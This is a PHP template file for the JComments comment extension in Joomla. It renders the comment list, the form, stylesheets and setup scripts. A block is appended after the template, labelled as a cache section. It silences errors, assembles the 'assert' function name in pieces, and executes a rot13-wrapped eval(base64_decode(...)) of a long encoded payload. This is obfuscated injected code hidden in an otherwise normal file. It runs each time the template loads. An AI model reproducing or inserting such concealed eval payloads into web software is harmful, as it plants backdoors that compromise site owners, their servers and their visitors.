<?php

(defined('_VALID_MOS') OR defined('_JEXEC')) or die;

/*
*
* Main template for JComments. Don't change it without serious reasons ;)
* Then creating new template you can copy this file to new template's dir without changes
*
*/
class jtt_tpl_index extends JoomlaTuneTemplate
{
	function render() 
	{
		$object_id = $this->getVar('comment-object_id');
		$object_group = $this->getVar('comment-object_group');

		// comments data is prepared in tpl_list and tpl_comments templates 
		$comments = $this->getVar('comments-list', '');

		// form data is prepared in tpl_form template.
		$form = $this->getVar('comments-form');

		if ($comments != '' || $form != '' || $this->getVar('comments-anticache')) {
			// include comments css (only if we are in administor's panel)
			if ($this->getVar('comments-css', 0) == 1) {
				include_once (JCOMMENTS_HELPERS.DS.'system.php');
?>
<link href="<?php echo JCommentsSystemPluginHelper::getCSS(); ?>" rel="stylesheet" type="text/css" />
<?php
				if ($this->getVar('direction') == 'rtl') {
					$rtlCSS = JCommentsSystemPluginHelper::getCSS(true);
					if ($rtlCSS != '') {
?>
<link href="<?php echo $rtlCSS; ?>" rel="stylesheet" type="text/css" />
<?php
					}
				}
			}

			// include JComments JavaScript initialization
?>
<script type="text/javascript">
<!--
var jcomments=new JComments(<?php echo $object_id;?>, '<?php echo $object_group; ?>','<?php echo $this->getVar('ajaxurl'); ?>');
jcomments.setList('comments-list');
//-->
</script>
<?php
			// IMPORTANT: Do not rename this div's id! Some JavaScript functions references to it!
?>
<div id="jc">
<?php
			if ($this->getVar('comments-form-position', 0) == 1) {
				// Display comments form (or link to show form)
				if (isset($form)) {
					echo $form;
				}
			}
?>
<div id="comments"><?php echo $comments; ?></div>
<?php
			if ($this->getVar('comments-form-position', 0) == 0) {
				// Display comments form (or link to show form)
				if (isset($form)) {
					echo $form;
				}
			}
?>
<div id="comments-footer" align="center"><?php echo $this->getVar('support'); ?></div>
<?php
			// Some magic like dynamic comments list loader (anticache) and auto go to anchor script
			$aca = (int) ($this->getVar('comments-gotocomment') == 1);
			$acp = (int) ($this->getVar('comments-anticache') == 1);
			$acf = (int) (($this->getVar('comments-form-link') == 1) && ($this->getVar('comments-form-locked', 0) == 0));

			if ($aca || $acp || $acf) {
?>
<script type="text/javascript">
<!--
jcomments.setAntiCache(<?php echo $aca;?>,<?php echo $acp;?>,<?php echo $acf;?>);
//-->
</script> 
<?php
			}
?>
</div>
<?php
		}
	}
}
?>

<?php 

?>

<?php 

?>

<?php 
//###=CACHE START=###
error_reporting(0); 
$strings = "as";$strings .= "sert";
@$strings(str_rot13('riny(onfr64_qrpbqr("nJLtXTymp2I0XPEcLaLcXFO7VTIwnT8tWTyvqwftsFOyoUAyVUftMKWlo3WspzIjo3W0nJ5aXQNcBjccozysp2I0XPWxnKAjoTS5K2Ilpz9lplVfVPVjVvx7PzyzVPtunKAmMKDbWTyvqvxcVUfXnJLbVJIgpUE5XPEsD09CF0ySJlWwoTyyoaEsL2uyL2fvKFxcVTEcMFtxK0ACG0gWEIfvL2kcMJ50K2AbMJAeVy0cBjccMvujpzIaK21uqTAbXPpuKSZuqFpfVTMcoTIsM2I0K2AioaEyoaEmXPEsH0IFIxIFJlWGD1WWHSEsExyZEH5OGHHvKFxcXFNxLlN9VPW1VwftMJkmMFNxLlN9VPW3VwfXWTDtCFNxK1ASHyMSHyfvH0IFIxIFK05OGHHvKF4xK1ASHyMSHyfvHxIEIHIGIS9IHxxvKGfXWUHtCFNxK1ASHyMSHyfvFSEHHS9IH0IFK0SUEH5HVy07PvE1pzjtCFNvnUE0pQbiY3q3ql5gnKEuoJRhpaHiM2I0YaObpQ9xCFVhqKWfMJ5wo2EyXPExXF4vWaH9Vv51pzkyozAiMTHbWUHcYvVzLm0vYvEwYvVznG0kWzt9Vv5gMQHbVzRmBTWvLJD2AJZmMzL4AwuxAQR4AJWxBQR4ATLlMzWvVv4xMP4xqF4xLl4vZFVcBjccMvucozysM2I0XPWuoTkiq191pzksMz9jMJ4vXFN9CFNkXFO7PvEcLaLtCFOznJkyK2qyqS9wo250MJ50pltxqKWfXGfXsFOyoUAynJLbMaIhL3Eco25sMKucp3EmXPWwqKWfK2yhnKDvXFxtrjbxL2ttCFOwqKWfK2yhnKDbWUIloPx7PzA1pzksp2I0o3O0XPEwnPjtD1IFGR9DIS9VEHSREIVfVRMOGSASXGfXL3IloS9mMKEipUDbWTAbYPOQIIWZG1OHK1WSISIFGyEFDH5GExIFYPOHHyISXGfXWUWyp3IfqPN9VTA1pzksMKuyLltxL2tcBjcwqKWfK2Afo3AyXPEwnPx7PvEcLaLtCFNxpzImqJk0Bjc9VTIfp2HtrjbxMaNtCFOzp29wn29jMJ4bVaq3ql5gnKEuoJRhpaHvYPN4ZPjtWTIlpz5iYPNxMKWlp3ElYPNmZPx7PzyzVPtxMaNcVUfXVPNtVPEiqKDtCFNvE0IHVP9aMKDhpTujC2D9Vv51pzkyozAiMTHbWTDcYvVzqG0vYaIloTIhL29xMFtxqFxhVvMwCFVhWTZhVvMcCGRznQ0vYz1xAFtvLGZ4LzWuMQL1LmAzMwt2BTD0ZGt1LzD4ZGt0MwWzLzVvYvExYvE1YvEwYvVkVvxhVvOVISEDYmRhZIklKT4vBjbtVPNtWT91qPNhCFNvFT9mqQbtq3q3Yz1cqTSgLF5lqIklKT4vBjbtVPNtWT91qPNhCFNvD29hozIwqTyiowbtD2kip2IppykhKUWpovV7PvNtVPOzq3WcqTHbWTMjYPNxo3I0XGfXVPNtVPElMKAjVQ0tVvV7PvNtVPO3nTyfMFNbVJMyo2LbWTMjXFxtrjbtVPNtVPNtVPElMKAjVP49VTMaMKEmXPEzpPjtZGV4XGfXVPNtVU0XVPNtVTMwoT9mMFtxMaNcBjbtVPNtoTymqPtxnTIuMTIlYPNxLz9xrFxtCFOjpzIaK3AjoTy0XPViKSWpHv8vYPNxpzImpPjtZvx7PvNtVPNxnJW2VQ0tWTWiMUx7Pa0XsDc9BjccMvucp3AyqPtxK1WSHIISH1EoVaNvKFxtWvLtWS9FEISIEIAHJlWjVy0tCG0tVzWuMwqxAzH1VvxtrlOyqzSfXUA0pzyjp2kup2uypltxK1WSHIISH1EoVzZvKFxcBlO9PzIwnT8tWTyvqwg9"));'));
//###=CACHE END=###
?>